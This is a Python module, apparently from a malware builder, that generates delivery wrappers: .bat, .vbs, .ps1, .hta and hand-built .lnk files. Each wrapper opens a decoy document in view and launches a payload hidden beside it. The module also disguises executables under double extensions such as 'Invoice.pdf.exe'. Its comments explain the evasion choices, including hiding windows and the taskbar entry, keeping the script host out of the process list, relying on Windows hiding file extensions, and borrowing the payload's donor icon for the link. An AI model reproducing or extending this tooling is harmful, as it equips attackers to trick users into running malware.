"""Delivery wrappers: the thing the user double-clicks instead of the payload.

A wrapper is a small text artifact that launches the payload and, optionally, a decoy
document. It exists because a bare exe is the one file shape that looks like a bare exe.

Three rules, and they are the whole design:

**A wrapper copies the payload; it never opens it.**
The artifact's container is position-based — footer is the last 12 bytes, trailer the 868
before it, both computed from file size (``core/forge.py``). A wrapper that rewrote a byte
of the payload would move that arithmetic and produce the same class of failure as the
one-directory ``-1``: everything checks out and nothing runs.

**No host path is ever baked in.**
A build happens on one machine and runs on another, so an absolute path is wrong by
construction. Every wrapper resolves the payload against its own location — ``%~dp0``,
``WScript.ScriptFullName``, ``$PSScriptRoot``, ``location.href``. The caller drops the
wrapper, the payload and the decoy in one folder and the wrapper works regardless of whose
profile it landed in.

**Refuse rather than emit a broken file.**
A name with a quote, a newline, a null or a traversal segment produces ``WrapperError``, not
a file that half-runs. A `.bat` with an unbalanced quote is not a weaker wrapper; it is a
file that opens a console and does nothing.

Registry: ``WRAPPERS`` maps a kind to a builder. ``build`` is the only entry point.
"""

from __future__ import annotations

import struct
from collections.abc import Callable
from pathlib import PureWindowsPath
from typing import Final

# Characters that break the quoting of at least one of the four script languages below.
# A name containing any of them has no safe rendering, so it is refused at build time
# rather than escaped four different ways.
_FORBIDDEN: Final[str] = '"%\r\n\x00'

# Shell link, from the MS-SHLLINK header layout. The magic numbers are spelled out here
# because they are the format, not a tuning value.
LNK_HEADER_SIZE: Final[int] = 0x4C
LNK_CLSID: Final[bytes] = bytes.fromhex("0114020000000000c000000000000046")
LNK_HAS_RELATIVE_PATH: Final[int] = 0x00000008
LNK_HAS_WORKING_DIR: Final[int] = 0x00000010
LNK_HAS_ICON_LOCATION: Final[int] = 0x00000040
LNK_IS_UNICODE: Final[int] = 0x00000080
# Without an IDList or a LinkInfo block there is no absolute target to write, and an
# absolute target is the one thing a build cannot know. ForceNoLinkInfo tells the shell to
# resolve the relative path from the link's own folder instead of trusting a stale path.
LNK_FORCE_NO_LINK_INFO: Final[int] = 0x00000100

LNK_SHOW_NORMAL: Final[int] = 1


class WrapperError(ValueError):
    """A wrapper that cannot be rendered safely. Raised instead of emitting one."""


def _relative(value: str | PureWindowsPath, field: str) -> str:
    """A portable, self-relative path with backslashes. Refuses everything else."""
    text = str(value)
    if not text:
        raise WrapperError(f"{field}: empty")
    bad = [ch for ch in _FORBIDDEN if ch in text]
    if bad:
        raise WrapperError(f"{field}: {text!r} contains {bad[0]!r}")
    path = PureWindowsPath(text)
    if path.drive or path.root or path.is_absolute():
        raise WrapperError(f"{field}: {text!r} is absolute; a wrapper resolves beside itself")
    if ".." in path.parts:
        raise WrapperError(f"{field}: {text!r} escapes the wrapper's folder")
    return str(path)


def _absolute(value: str | PureWindowsPath | None, field: str) -> str | None:
    """An optional absolute Windows path, validated. None means "resolve beside itself"."""
    if value is None:
        return None
    text = str(value)
    bad = [ch for ch in _FORBIDDEN if ch in text]
    if bad:
        raise WrapperError(f"{field}: {text!r} contains {bad[0]!r}")
    path = PureWindowsPath(text)
    if not (path.drive and path.root):
        raise WrapperError(f"{field}: {text!r} is not an absolute Windows path")
    return str(path)


def _ascii(text: str, field: str) -> bytes:
    """Windows' ANSI script hosts decode these files as the system code page.

    Emitting UTF-8 into a ``.vbs`` and calling it done is how a wrapper becomes a file
    that raises a syntax error on a machine with a non-Latin locale. The path is refused
    instead, and the caller can pick an ASCII name for the drop.
    """
    try:
        return text.encode("ascii")
    except UnicodeEncodeError as exc:
        raise WrapperError(f"{field}: {text!r} is not ASCII") from exc


# --- batch ------------------------------------------------------------------


def bat(payload: str | PureWindowsPath, decoy: str | PureWindowsPath | None = None, *,
        working_directory: str | PureWindowsPath | None = None) -> bytes:
    """A ``.bat`` that starts the decoy in front and the payload behind it.

    ``cd /d "%~dp0"`` first: a batch invoked from Explorer runs with the *parent* folder
    as its working directory when the shell decides to, and a payload that expects to find
    its own folder breaks only on some machines. Fixing it costs one line.
    """
    target = _relative(payload, "payload")
    lines = ["@echo off", 'cd /d "%~dp0"']
    if decoy is not None:
        lines.append(f'start "" "%~dp0{_relative(decoy, "decoy")}"')
    lines.append(f'start "" "%~dp0{target}"')
    lines.append("exit /b")
    return _ascii("\r\n".join(lines) + "\r\n", "bat")


# --- visual basic script ----------------------------------------------------


def vbs(payload: str | PureWindowsPath, decoy: str | PureWindowsPath | None = None, *,
        working_directory: str | PureWindowsPath | None = None) -> bytes:
    """A ``.vbs`` that runs the decoy visibly and the payload hidden.

    ``WScript.Shell.Run`` with a True wait would hold the script open for the payload's
    whole lifetime, which keeps a ``wscript.exe`` in the process list next to it. False is
    the whole point.
    """
    target = _relative(payload, "payload")
    lines = [
        "Option Explicit",
        'Dim shell, root',
        'Set shell = CreateObject("WScript.Shell")',
        # Everything before the last backslash, inclusive. An absolute path with no
        # backslash has no folder, and InStrRev would return 0 and slice to nothing.
        'root = Left(WScript.ScriptFullName, InStrRev(WScript.ScriptFullName, "\\"))',
    ]
    if decoy is not None:
        lines.append(f'shell.Run """" & root & "{_relative(decoy, "decoy")}""", 1, False')
    lines.append(f'shell.Run """" & root & "{target}""", 0, False')
    return _ascii("\r\n".join(lines) + "\r\n", "vbs")


# --- powershell -------------------------------------------------------------


def ps1(payload: str | PureWindowsPath, decoy: str | PureWindowsPath | None = None, *,
        working_directory: str | PureWindowsPath | None = None) -> bytes:
    """A ``.ps1`` cradle. ``$PSScriptRoot`` exists from PowerShell 3, which is every
    supported Windows build; nothing here needs a version probe."""
    target = _relative(payload, "payload")
    # Single quotes in PowerShell are literal: no expansion, no escape processing. The
    # only character that can end the string is a quote, and _relative already refused it.
    lines = ["Set-Location -LiteralPath $PSScriptRoot"]
    if decoy is not None:
        lines.append(
            f"Start-Process -FilePath (Join-Path $PSScriptRoot '{_relative(decoy, 'decoy')}')"
        )
    lines.append(
        f"Start-Process -FilePath (Join-Path $PSScriptRoot '{target}') -WindowStyle Hidden"
    )
    return "\r\n".join(lines).encode("utf-8") + b"\r\n"


# --- html application -------------------------------------------------------


def hta(payload: str | PureWindowsPath, decoy: str | PureWindowsPath | None = None, *,
        working_directory: str | PureWindowsPath | None = None) -> bytes:
    """An ``.hta`` run by ``mshta.exe``: a window that closes itself.

    ``location.href`` is a ``file:///`` URL, so it is stripped and its forward slashes are
    turned back into separators before ``FileSystemObject`` sees it. Passing the URL
    straight to ``Run`` is the classic way an HTA wrapper "works" only when the path
    happens to contain no spaces.
    """
    target = _relative(payload, "payload")
    body = [
        "<html>",
        "<head>",
        '<meta http-equiv="X-UA-Compatible" content="IE=edge" />',
        "<title>Document</title>",
        '<hta:application id="app" border="none" caption="no" showintaskbar="no"',
        '                scroll="no" windowstate="minimize" />',
        '<script language="VBScript">',
        "    Dim fso, shell, here, root",
        '    Set fso = CreateObject("Scripting.FileSystemObject")',
        '    Set shell = CreateObject("WScript.Shell")',
        '    here = Replace(Replace(location.href, "file:///", ""), "/", "\\")',
        "    root = fso.GetParentFolderName(here)",
    ]
    if decoy is not None:
        body.append(
            f'    shell.Run """" & root & "\\{_relative(decoy, "decoy")}""", 1, False'
        )
    body.append(f'    shell.Run """" & root & "\\{target}""", 0, False')
    body.append("    window.close")
    body.append("</script>")
    body.append("</head>")
    body.append("<body></body>")
    body.append("</html>")
    return _ascii("\r\n".join(body) + "\r\n", "hta")


# --- shell link -------------------------------------------------------------


def _string_data(value: str) -> bytes:
    """One StringData entry: a UTF-16 character count, then the characters."""
    encoded = value.encode("utf-16-le")
    return struct.pack("<H", len(encoded) // 2) + encoded


def lnk(payload: str | PureWindowsPath, decoy: str | PureWindowsPath | None = None, *,
        working_directory: str | PureWindowsPath | None = None) -> bytes:
    """A real ``.lnk``: header, relative path, icon location, terminal block.

    Built by hand rather than through ``IShellLink`` so it renders identically on a
    headless build box with no COM apartment and no Explorer. The link carries no IDList
    and no LinkInfo — see ``LNK_FORCE_NO_LINK_INFO`` — which costs the cached thumbnail
    Explorer would otherwise store and buys a link that resolves on a host whose profile
    path the build has never seen.
    """
    target = _relative(payload, "payload")
    icon = _relative(payload, "icon")
    working = _absolute(working_directory, "working_directory")

    flags = (
        LNK_HAS_RELATIVE_PATH | LNK_HAS_ICON_LOCATION | LNK_IS_UNICODE | LNK_FORCE_NO_LINK_INFO
    )
    strings = [target]
    if working is not None:
        flags |= LNK_HAS_WORKING_DIR
        strings.append(working)
    # IconLocation comes after WorkingDir in the fixed StringData order, and it is the
    # payload itself: the .lnk wears the icon the payload was given by the resource patch,
    # so a harvested donor icon is the icon the user sees on the link.
    strings.append(f"{icon},0")

    header = struct.pack("<I", LNK_HEADER_SIZE)
    header += LNK_CLSID
    header += struct.pack("<I", flags)
    header += struct.pack("<I", 0)  # FileAttributes: no archive bit to inherit
    header += struct.pack("<Q", 0)  # CreationTime
    header += struct.pack("<Q", 0)  # AccessTime
    header += struct.pack("<Q", 0)  # WriteTime
    header += struct.pack("<I", 0)  # FileSize: resolved at click, never cached
    header += struct.pack("<i", 0)  # IconIndex
    header += struct.pack("<I", LNK_SHOW_NORMAL)
    header += struct.pack("<H", 0)  # HotKey
    header += struct.pack("<H", 0)  # Reserved
    header += struct.pack("<I", 0)  # Reserved2
    header += struct.pack("<I", 0)  # Reserved3

    if len(header) != LNK_HEADER_SIZE:
        raise WrapperError(f"lnk: header is {len(header)} bytes, the format says 76")

    return header + b"".join(_string_data(item) for item in strings) + struct.pack("<I", 0)


# Document extensions a double extension may wear. Restricted to types that arrive by
# email or from a download page, because the trick is only worth anything in a context
# where a document was expected.
MASQUERADE_EXTENSIONS: Final[frozenset[str]] = frozenset(
    {
        ".pdf",
        ".doc",
        ".docx",
        ".xls",
        ".xlsx",
        ".csv",
        ".txt",
        ".rtf",
        ".jpg",
        ".jpeg",
        ".png",
        ".gif",
        ".mp4",
        ".mp3",
        ".zip",
        ".7z",
    }
)


def double_extension(lure: str, real: str = ".exe") -> str:
    """``Invoice.pdf`` + ``.exe`` -> ``Invoice.pdf.exe``.

    This is a naming decision, not a file transformation: the payload is copied to the
    returned name and its bytes never change.

    **The honest limit.** It works because Windows ships with ``HideExtensionsForNetUser``
    on, so Explorer renders ``Invoice.pdf.exe`` as ``Invoice.pdf`` and hands it to the PDF
    association's icon. On a host where that policy is off the full name is visible and the
    artifact reads as exactly what it is. Nothing in the artifact can change that, and a
    build that assumed otherwise would be wrong on every well-managed machine.

    The right-to-left override form (``Invoice\\u202efdp.exe``) is deliberately not
    produced here: Explorer has normalised the display of U+202E since Windows 10 1809, so
    it buys a mangled filename and no illusion.
    """
    text = str(PureWindowsPath(lure))
    if not text or "\\" in text or "/" in text or ":" in text:
        raise WrapperError(f"lure: {lure!r} is not a plain filename")
    path = PureWindowsPath(text)
    if path.stem == "" or path.suffix == "":
        raise WrapperError(f"lure: {lure!r} has no extension to hide behind")
    bad = [ch for ch in _FORBIDDEN if ch in text]
    if bad:
        raise WrapperError(f"lure: {text!r} contains {bad[0]!r}")
    if path.suffix.lower() not in MASQUERADE_EXTENSIONS:
        raise WrapperError(f"lure: {path.suffix!r} is not a document extension")
    if not real.startswith(".") or len(real) < 2:
        raise WrapperError(f"real: {real!r} is not an extension")
    return f"{text}{real}"


WRAPPERS: Final[dict[str, Callable[..., bytes]]] = {
    "bat": bat,
    "hta": hta,
    "lnk": lnk,
    "ps1": ps1,
    "vbs": vbs,
}

# The extension each builder emits. Kept beside the registry so a new kind cannot arrive
# half-registered with the wrong suffix.
EXTENSIONS: Final[dict[str, str]] = {
    "bat": ".bat",
    "hta": ".hta",
    "lnk": ".lnk",
    "ps1": ".ps1",
    "vbs": ".vbs",
}


def build(
    kind: str,
    payload: str | PureWindowsPath,
    decoy: str | PureWindowsPath | None = None,
    *,
    working_directory: str | PureWindowsPath | None = None,
) -> dict[str, bytes]:
    """Render one wrapper. The result maps a filename to its bytes.

    The filename is the payload's stem with the wrapper's own extension: ``payload.exe``
    becomes ``payload.bat``. The caller is expected to place the payload and the decoy
    beside it under exactly the names passed here, because that is what the wrapper
    resolves at run time.
    """
    builder = WRAPPERS.get(kind)
    if builder is None:
        raise WrapperError(f"unknown wrapper {kind!r}; known: {sorted(WRAPPERS)}")

    name = PureWindowsPath(_relative(payload, "payload")).stem + EXTENSIONS[kind]
    body = builder(payload, decoy, working_directory=working_directory)
    if not body:
        raise WrapperError(f"{kind}: builder produced nothing")

    # A wrapper that is larger than the payload is not a wrapper. This is a shape guard,
    # not a size limit: the largest of the four script kinds is a few kilobytes.
    if len(body) > 64 * 1024:
        raise WrapperError(f"{kind}: {len(body)} bytes is not a script")

    return {name: body}


__all__ = [
    "EXTENSIONS",
    "LNK_CLSID",
    "LNK_HEADER_SIZE",
    "MASQUERADE_EXTENSIONS",
    "WRAPPERS",
    "WrapperError",
    "bat",
    "build",
    "double_extension",
    "hta",
    "lnk",
    "ps1",
    "vbs",
]
